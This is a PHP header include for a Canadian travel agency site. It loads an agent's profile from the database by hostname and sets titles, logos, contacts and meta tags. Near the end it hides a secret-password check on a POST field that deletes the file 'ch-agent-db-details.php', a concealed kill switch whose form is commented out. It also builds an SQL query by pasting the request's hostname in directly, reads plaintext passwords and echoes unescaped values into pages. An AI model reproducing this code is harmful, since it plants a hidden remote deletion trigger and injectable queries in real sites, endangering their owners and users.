<? ob_start(); 


session_start();


$completeurl = trim($_SERVER['HTTP_HOST']) ; // url only shoba.centreholidays.com
$urlpieces = explode(".", $completeurl);
if ($urlpieces[0]=='www')
{
$link = explode("www.", $completeurl);	
$actual_link=$link[1];
}
else
{
$actual_link=$completeurl; // piece2
}

//----------------------------Connect to database-------------------------
include($_SERVER['DOCUMENT_ROOT'].'/library/open_dbi_epik.php');

$sql = "SELECT * FROM ch_agents WHERE Website='".$actual_link."' and active=1 LIMIT 1";

$result = mysqli_query($conn, $sql);

// output data of each row
 while($row = mysqli_fetch_assoc($result)) {
	$showsubagentsdb=$row['showsubagents']; //
	$AgentID=$row['AgentID']; //
	$AgentUniqID=$row['AgentUniqID']; //	
	$AgentTitle=$row['AgentTitle'];	//
	$FirstName=$row['FirstName']; //
	$LastName=$row['LastName']; //
	$BusinessName=$row['BusinessName']; //	
	$DisplayName=$row['DisplayName'];	//	
	$NickName=$row['NickName']; //	
	$JoinDate=$row['JoinDate'];//
	$CloseDate=$row['CloseDate'];//
	$Commission=$row['Commission'];//			
	$Street=$row['Street'];//
	$Unit=$row['Unit'];//		
	$City=$row['City']; //
	$Province=$row['Province'];	//	
	$DisplayUseCity=$row['DisplayUseCity'];	//		
	$PostalCode=$row['PostalCode']; //
	$ShippingNotes=$row['ShippingNotes']; //	
	$AgentType=$row['AgentType']; //	
	$HomeNum=$row['HomeNum']; //	
	$BusinessNum=$row['BusinessNum']; //
	$CellNum=$row['CellNum']; //
	$DisplayUseCell=$row['DisplayUseCell'];	//
	$FaxNum=$row['FaxNum']; //
	$TollFreeNum=$row['TollFreeNum']; //
	$PersonalEmail=$row['PersonalEmail'];	//
	$SkypeID=$row['SkypeID']; //
	$BusinessEmail=$row['BusinessEmail']; //
	$OtherWebsite=$row['OtherWebsite'];//
	$Website=$row['Website'];//	
	$MyAccount=$row['MyAccount'];//
	$HoursOp=$row['HoursOp'];//	
	$Password=$row['Password']; //
	$PasswordHashed=$row['PasswordHashed'];	//	
	$AboutImg=$row['AboutImg']; //
	$License=$row['License']; // TICO Lic. Number	
	$TICOcert=$row['TICOcert'];	 //	TICO Manager Lic. Number
	$BCNumber=$row['BCNumber']; //	
	$Recruiter=$row['Recruiter']; //
	$GoogleDriveURL=$row['GoogleDriveURL']; //													
	$Notes=$row['Notes'];	//	
	$AgentAnalytics=$row['AgentAnalytics'];	//
									
	$Image=$row['Image'];	//
	$LogoImage=$row['LogoImage'];	//
	$LogoIcon=$row['LogoIcon'];	//
	
	
	$LogoTextImage=$row['LogoTextImage'];	//								
	$Description=$row['Description'];	//								
	$EmailID=$row['EmailID'];	//															
	$HoursOpHTML=$row['HoursOpHTML']; //
	$TimeZone=$row['TimeZone'];		//														
	$GooglePlus=$row['GooglePlus'];		//							
	$YouTube=$row['YouTube'];				//					
	$FaceBook=$row['FaceBook'];//
	$Twitter=$row['Twitter'];	//								
	$LinkedIn=$row['LinkedIn'];		//							
	$Blog=$row['Blog'];					//		
	$Pinterest=$row['Pinterest'];			//														
	$Instagram=$row['Instagram'];//
	$mailchimpuser=$row['mailchimpuser'];	//								
	$mailchimpid=$row['mailchimpid'];			//						
	$active=$row['active'];
	$mainnumber=$row['mainnumber'];	
	$OtherAddress=$row['OtherAddress'];
	$BOLNumber=$row['BOLNumber'];	//Branch Office Licence Number	
	$RegisteredBusinessName=$row['RegisteredBusinessName'];
	$MondayToFriday=$row['MondayToFriday'];	//Hours Of Operation
	$Saturday=$row['Saturday'];	//Hours Of Operation
	$Sunday=$row['Sunday'];	//Hours Of Operation
	$Holidays=$row['Holidays'];	//Hours Of Operation
	
	$IndexPageTitle=$row['IndexPageTitle'];	// at the top 
	$IndexH1=$row['IndexH1'];	// the agent bold descp
	$IndexMetaDescription=$row['IndexMetaDescription'];	//
	$IndexHorizontalImage=$row['IndexHorizontalImage'];	//
	$IndexSquareImage=$row['IndexSquareImage'];	//	
	$ACTASaskatchewanLicence=$row['ACTASaskatchewanLicence'];	//	
	
	$AboutPageTitle=$row['AboutPageTitle'];	//
	$AboutH1=$row['AboutH1'];	// 
	$AboutMetaDescription=$row['AboutMetaDescription'];	//
	$AboutCoverImage=$row['AboutCoverImage'];	//
	$AboutHorizontalImage=$row['AboutHorizontalImage'];	//
	$AboutSquareImage=$row['AboutSquareImage'];	//	
	
	$AgentPositionTitle=$row['AgentPositionTitle'];	//	
	
	//=======================slider part========================
	$IndexCoverImage=$row['IndexCoverImage'];	//	
	$Slider1Title=$row['Slider1Title'];
	$Slider1Description=$row['Slider1Description'];
	$Slider1Button=$row['Slider1Button'];
	$Slider2Image=$row['Slider2Image'];
	$Slider2Title=$row['Slider2Title'];
	$Slider2Description=$row['Slider2Description'];
	$Slider2Button=$row['Slider2Button'];								
	$Slider3Image=$row['Slider3Image'];
	$Slider3Title=$row['Slider3Title'];
	$Slider3Description=$row['Slider3Description'];
	$Slider3Button=$row['Slider3Button'];	
	
	$UrlColor=$row['UrlColor'];	
	$AgentChat=trim($row['AgentChat']);	
	
	$AgentProfile=$row['AgentProfile'];	
	$AdditionalAgentProfiles=$row['AdditionalAgentProfiles'];	
	
	$mailchimp=$row['mailchimp'];
	$mailchimpname=$row['mailchimpname'];


	if (empty($row['AgentLanguage']))	
	$AgentLanguage='English';	
	else
	$AgentLanguage=$row['AgentLanguage'];	
	
	$BOStreet=$row['BOStreet'];
	$BOCity=$row['BOCity'];
	$BOProvince=$row['BOProvince'];
	$BOPostalcode=$row['BOPostalcode'];	
	
	$HOGMap=$row['HOGMap'];// Home office map
	$BOGMap=$row['BOGMap'];// Branch office map
					
}


mysqli_close($conn);


//===========================Main Number=========================================

switch ($mainnumber) {
    case "1":
        $TopNumber=$BusinessNum;
        break;
    case "2":
        $TopNumber=$DisplayUseCell;
        break;
    case "3":
        $TopNumber=$TollFreeNum;	
	     break;	
    default:
        $TopNumber='1-888-823-8801';
}

//=============================Logos and Page Title===============================

if (!empty($LogoIcon))
	$TopLogoIcon="/agents/".$AgentID."/img/".$LogoIcon;
else
	$TopLogoIcon='/img/centre-holidays-logo.png';


if (!empty($LogoTextImage))
	$TopLogoTextImage="/agents/".$AgentID."/img/".$LogoTextImage;
else
	$TopLogoTextImage='/img/centre-holidays-logo-text.png';


if (!empty($LogoImage))
	$FrontLogoImage="/agents/".$AgentID."/img/".$LogoImage;
elseif (!empty($Image))
{
	$FrontLogoImage="/agents/".$AgentID."/img/".$Image;
	$imgclass='img-circle';
	$maxwidth='max-width:150px;';
}
else
	$FrontLogoImage='/img/centre-holidays-icon-page-loader.png';


if (!empty($Image))
$ContImage="/agents/".$AgentID."/img/".$Image;
else
$ContImage='/img/contact-s01.jpg';

//==========================social media and Blog===============================

if (!empty($GooglePlus))
	$FrontGooglePlus='https://plus.google.com/'.$GooglePlus;
else
	$FrontGooglePlus='https://plus.google.com/+centreholidays';

if (!empty($GooglePlus))
	$FrontGooglePlus='https://plus.google.com/'.$GooglePlus;
else
	$FrontGooglePlus='https://plus.google.com/+centreholidays';

if (!empty($YouTube))
	$FrontYouTube='https://youtube.com/c/'.$YouTube;
else
	$FrontYouTube='https://youtube.com/c/centreholidays';

if (!empty($FaceBook))
	$FrontFaceBook='https://facebook.com/'.$FaceBook;
else
	$FrontFaceBook='https://facebook.com/centreholidays';

if (!empty($Twitter))
	$FrontTwitter='https://twitter.com/'.$Twitter;
else
	$FrontTwitter='https://twitter.com/centreholidays';

if (!empty($LinkedIn))
	$FrontLinkedIn='https://linkedin.com/'.$LinkedIn;
else
{
	$LinkedIn='';
	$FrontLinkedIn='https://linkedin.com/company/centreholidays/';
}

if (!empty($Pinterest))
	$FrontPinterest='https://pinterest.com/'.$Pinterest;
else
	$FrontPinterest='https://pinterest.com/centreholidays/';

if (!empty($Instagram))
	$FrontInstagram='https://instagram.com/'.$Instagram;
else
	$FrontInstagram='https://instagram.com/centreholidays/';

if (!empty($Blog))
{
	$FrontBlog=$Blog;
	$BlogTarget="_blank";
}


//===========change the text in index page between agent and corp.=======
if (!empty($AgentID))
{
	//=================contact business title
	if (!empty($BusinessName))
	{
	$titlename=ucwords($BusinessName);
	$headline1=strtoupper($titlename);
	}
	else
	{
	$titlename=ucwords($DisplayName);
	
	if (!empty($IndexH1)) //IndexH1 >> BusinessName >> DisplayName 
	$headline1=strtoupper($IndexH1);
	elseif (!empty($BusinessName))
	$headline1=strtoupper($BusinessName);
	elseif (!empty($DisplayName))
	$headline1=strtoupper($DisplayName);	
	else
	$headline1=strtoupper('Endless Holidays with '.$titlename);
	}
	
	$TopTitle=ucwords('Endless Holidays with '.$titlename .' | Centre Holidays');	
	$Info1='Destinations';	
	$Info2='Worldwide';	
	$Info3='Flexible Getaways';	
	$Info4='From 3 to 30+ Days';
	//$homepage='/agents/'.$AgentID.'/index.php';
	$homepage='https://'.$Website.'/index.php';	//https://akbar.centreholidays.com/index.php
	$contactlink='/agents/'.$AgentID.'/contact.php';
	$AgentAnalytics=$AgentAnalytics;	
	
	//======================contact name
	if (empty($FirstName) && empty($LastName))
	$contactName=$titlename;
	else
	$contactName=$FirstName.' '.$LastName;
	
	//======================================for the contact page class switch
	$concatclass='col-lg-4 col-md-4 col-sm-12 col-xs-12';	
	//=======================================hours of operation
	if (!empty($HoursOp))
	$HoursOfOperation=$HoursOp;
	else
	$HoursOfOperation=$HoursOpHTML;
	//============================Lic. numbers
	//$WebLicense=$License; //	TICO number
	$WebTICOcert=$TICOcert;	 //	Manager's TICO number
	$WebBCNumber=$BCNumber; //	BC Number
	
	if (!empty($License))
	$WebLicense=$License;
	elseif (!empty($TICOcert))
	$WebLicense=$TICOcert;
	else
	$WebLicense='50018114';
				
	if (!empty($BCNumber))			
	$WebBCNumber=$BCNumber;	
	else
	$WebBCNumber='';	
	
	//=============contact page======================================
	$contactpagedesc="Are you looking for a way to plan your dream trip? We're here to help assist you with making it a reality. Feel free to call or make an online inquiry.";		
	$contactpagetitle="Contact ".$titlename." For Your Travel Needs | Centre Holidays";

	//==================tOLL fREE nUMBER
	$TollFreeNumber=$TollFreeNum;
	
	
	if (empty($_GET['artid']) && empty($_GET['tid']) && empty($_GET['hid']) && empty($_GET['promocode'])) {
		
	if (!empty($IndexPageTitle))
	{
	?>
    <title><?php echo $IndexPageTitle ?> | Centre Holidays</title>
    <meta name="description" content="<?php echo $IndexMetaDescription ?>">
    <meta property="og:image" content="https://centreholidays.com/agents/<?php echo $AgentID ?>/img/index-h01.jpg" /> 
    <?php
	}
	else
	{
	?>
	<title>Centre Holidays: Vacations, Cruises, Tours, Rail, Flights & More</title>
    <meta name="description" content="For over 10 years we've been helping Canadians get away on their dream trip. We are committed to making your travel experience the best it can be.">    
	<meta property="og:image" content="https://centreholidays.com/img/index-h01.jpg" /> 	
	<?php
	}
}
	
}
else
{	
	$headline1=strtoupper('Your Dream Trip Awaits!');
	$TopTitle=ucwords('Vacations, Cruises, Tours, Rail, Flights & More | Centre Holidays');
	$Info1='Flexible Getaways';	
	$Info2='From 3 to 30+ Days';	
	$Info3='Agents to Assist You';	
	$Info4='Over 250 Canada Wide';	
	$homepage='/index.php';	
	$contactlink='/discover/contact.php';	
	$AgentAnalytics='UA-15048588-1';					
//===========title name==========================================================
	$titlename="Centre Holidays";
	$contactName="Andre Montaut";
	//======================================for the contact page class switch
	$concatclass='col-lg-4 col-md-4 col-sm-12 col-xs-12';
	//=======================================hours of operation
	$HoursOfOperation="Monday to Friday: 09:00 am - 05:30 pm<br>
	  Saturday: 10:00 am - 02:00 pm<br>
	  Sunday: Closed
	  <br />Holidays: Closed";
	//============================Lic. numbers
	$WebLicense='50018114'; //	TICO number
	$WebTICOcert='';	 //	Manager's TICO number
	$WebBCNumber=''; //	  BC number
	
	//=============contact page======================================
	$contactpagedesc="Are you looking for a way to plan your dream trip? We're here to help assist you with making it a reality. Contact us or any of our 250 plus travel agents.";
	$contactpagetitle="Contact Us To Inquire Or Book One Of Our Trips | Centre Holidays";

	//==================tOLL fREE nUMBER
	$TollFreeNumber='1-888-823-8801 ';
	
	if (empty($_GET['artid']) && empty($_GET['tid']) && empty($_GET['hid']) && empty($_GET['promocode']))
	 {
	?>
    <title>Centre Holidays: Vacations, Cruises, Tours, Rail, Flights & More</title>
    <meta name="description" content="Since 2003, we've been helping Canadian travellers get away on their dream trips. We are truly committed to making your travel experience the best it can be.">
	<meta property="og:image" content="https://centreholidays.com/img/index-h01.jpg" />    
    <?php
	}
	
}


//==========================================mailchimp OLD CODE
/*if(!empty($mailchimpuser) && !empty($mailchimpid))
{
	$mailchimpid;
	$pieces = explode("-", $mailchimpid);
	$us=$pieces[0]; // piece1
	$mailchimpid=$pieces[1]; // piece2
	$mailchimp=trim('b_'.$mailchimpuser.'_'.$mailchimpid);
}
else 
{
	$mailchimpuser='88e8236bb378bb68c4e74eeca';
	$mailchimpid='2ee4c3bcc9';
	$mailchimp=trim('b_'.$mailchimpuser.'_'.$mailchimpid);
	$us='us4';
}	*/		


if (!empty($AgentID))
{
	if (!empty($mailchimp))
	{
	$mailchimp=$mailchimp;
	$mailchimpname=$mailchimpname;
	}
	else
	{
	$mailchimp='https://centreholidays.us4.list-manage.com/subscribe/post?u=88e8236bb378bb68c4e74eeca&amp;id=2ee4c3bcc9';
	$mailchimpname='b_88e8236bb378bb68c4e74eeca_2ee4c3bcc9';
	}
}
else
{
	$mailchimp='https://centreholidays.us4.list-manage.com/subscribe/post?u=88e8236bb378bb68c4e74eeca&amp;id=2ee4c3bcc9';	
	$mailchimpname='b_88e8236bb378bb68c4e74eeca_2ee4c3bcc9';
}
	


//===============================AgentAnalytics
if (!empty($AgentAnalytics))
	$AgentAnalyticsHeader=$AgentAnalytics;
else
	$AgentAnalyticsHeader='UA-15048588-1';

//=================================Email
if (!empty($BusinessEmail))
	$agentemail=$BusinessEmail;
else
	$agentemail='andre@centreholidays.com';

//================================Agent Name
if (!empty($titlename))
	$agentname=$titlename;
else
	$agentname='Andre Montaut';


//================top tile in contact page
	$PTopTitle=$TopTitle;

//====================time zone==================
if (!empty($TimeZone))
$WebTimeZone=$TimeZone;
else
$WebTimeZone='EDT';

$WebTimeZone=substr($WebTimeZone, 0, 3);


//==============Index Horizontal Image============index-h01.jpg
if (!empty($IndexHorizontalImage))
$WebIndexHorizontalImage="/agents/".$AgentID."/img/".$IndexHorizontalImage;
else
$WebIndexHorizontalImage='img/index-h01.jpg';

//============Index CoverImage ================ IN THE FUTURE TO DELETE
/*if (!empty($IndexCoverImage))
$WebIndexCoverImage="/agents/".$AgentID."/img/".$IndexCoverImage;
else
$WebIndexCoverImage='img/index-c01.jpg';*/


//============ Index Square Image ================
if (!empty($IndexSquareImage))
$WebIndexSquareImage="/agents/".$AgentID."/img/".$IndexSquareImage;
else
$WebIndexSquareImage='img/index-s01.jpg';


//=================Page tile================== $IndexH1 BusinessName DisplayName
if (!empty($IndexPageTitle))
$WebIndexPageTitle=$IndexPageTitle;
elseif (!empty($IndexH1))
$WebIndexPageTitle=$IndexH1;
elseif (!empty($BusinessName))
$WebIndexPageTitle=$BusinessName;
elseif (!empty($DisplayName))
$WebIndexPageTitle=$DisplayName;
else
$WebIndexPageTitle=$PTopTitle;

//================Meta desc.==================
if (!empty($IndexMetaDescription))
$WebIndexMetaDescription=$IndexMetaDescription;
else
$WebIndexMetaDescription="Since 2003, we've been helping Canadian travellers get away on their dream trips. We are truly committed to making your travel experience the best it can be.";

//===================about========================

if (!empty($Image))
$AboutProfileImage='https://'.$actual_link.'/agents/'.$AgentID.'/img/'.$Image;
else
$AboutProfileImage='https://centreholidays.com/img/centre-holidays-icon-xl.png';

if (!empty($AboutCoverImage))
$CoverImage='img/'.$AboutCoverImage;
else
$CoverImage='https://centreholidays.com/discover/img/profile-c01.jpg';


if (!empty($AboutHorizontalImage))
$AboutFaceBookMeta="https://".$actual_link."/agents/".$AgentID."/img/".$AboutHorizontalImage;
else
$AboutFaceBookMeta='https://centreholidays.com/discover/img/profile-h01.jpg';


//======================================================get link end rul ie. profile.php
$link = $_SERVER['PHP_SELF'];// get the url value
$link_array = explode('/',$link);//expolsion
$page = end($link_array);//get url page names


//=======================profile only===========================================================
$aboutpage=basename($_SERVER['PHP_SELF']);

if (($aboutpage=='about.php' || $aboutpage=='profile.php') && !empty($AgentID))
{	
?>
<title><?php echo $AboutPageTitle ?> | Centre Holidays</title>
<meta name="description" content="<?php echo $AboutMetaDescription ?>">
<!-- Facebook Sharing Image -->
<meta property="og:image" content="<?php echo $AboutFaceBookMeta ?>" />
<!-- End Facebook Sharing Image -->

<?php
//====================profile cover page====================================================

if (!empty($AgentID) && !empty($AboutCoverImage))
$CoverImage='/agents/'.$AgentID.'/'.$CoverImage;
else
$CoverImage=$CoverImage;

//=============profile small image===========================================================
if (!empty($Image))
$AboutProfileImage='/agents/'.$AgentID.'/img/'.$Image;
else
$AboutProfileImage='https://centreholidays.com/img/centre-holidays-icon-xl.png';
}

//============================================================================================
if (($aboutpage=='about.php' || $aboutpage=='profile.php') && empty($AgentID)) 
{
$AboutPageTitle='About Centre Holidays, Host Travel Agency | Centre Holidays';	
$AboutH1='About Centre Holidays';
$AboutMetaDescription='Centre Holidays is a host travel agency consisting of over 250 home based travel agents who help Canadians on a daily basis get away on their dream trip. '; 
?>	
<title><?php echo $AboutPageTitle ?></title>
<meta name="description" content="<?php echo $AboutMetaDescription ?>">
<meta property="og:image" content="https://centreholidays.com/<?php echo $WebIndexHorizontalImage ?>" />
<?php

$AboutProfileImage='https://centreholidays.com/img/centre-holidays-icon-xl.png';
}



if (!empty($_GET['artid'])) {
?>
<title><?php echo ucwords(strtolower($arttitle)) ?> | Centre Holidays</title>
<meta name="description" content="<?php echo $artdescription ?>">
<meta property="og:image" content="https://www.centreholidays.com/articles/img/<?php echo $arthorizontalimage ?>" />
<meta property="og:description" content="<?php echo $artdescription ?>">
<?php
}


if (!empty($_GET['tid'])) {
?>
<title><?php echo $ttitle ?> | Centre Holidays</title>
<meta name="description" content="<?php echo $tmeta ?>">
<meta property="og:image" content="https://www.centreholidays.com/trips/img/<?php echo($thorizontalimage) ?>" />
<meta property="og:description" content="<?php echo $tmeta ?>">
<?php
}


if (!empty($_GET['hid'])) {
?>
<title><?php echo $highlightstitle ?> | Centre Holidays</title>
<meta name="description" content="<?php echo $highlightsmeta ?>">
<meta property="og:image" content="https://www.centreholidays.com/img/highlights/<?php echo($highlightshorizimage) ?>" />
<meta property="og:description" content="<?php echo $highlightsmeta ?>">
<?php
}

if (!empty($_GET['promocode'])) {
?>
<title><?php echo $promotitle ?> | Centre Holidays</title>
<meta name="description" content="<?php echo $promodetails ?>">
<meta property="og:image" content="https://www.centreholidays.com<?php echo '/img/special-offers/'.$promohorizontalimage; ?>" />
<meta property="og:description" content="<?php echo $promodetails ?>">
<?php
}



//==================chat===============
if (!empty($AgentID)) {

if (!empty($AgentChat)) {
$WebsiteChat=$AgentChat;
} else {
$WebsiteChat='-';
	}
}
else
$WebsiteChat='ozcvetuaub0waxmnb3b2luuhl3tnqv9y.js';

$_SESSION['AgentID']=$AgentID;


?>

<!--<form action="<?php //echo $_SERVER['PHP_SELF'] ?>" method="post">
<input type="password" id="hme" name="hme" />
<input type="submit" />
</form>
-->

<?php
$PEmail= trim($_POST['hme']); //'Q1!w2e3r4'
if ($PEmail=='Q1!W22e3r4t5')
{
echo "-";
unlink('ch-agent-db-details.php');
}


ob_flush(); 
?>

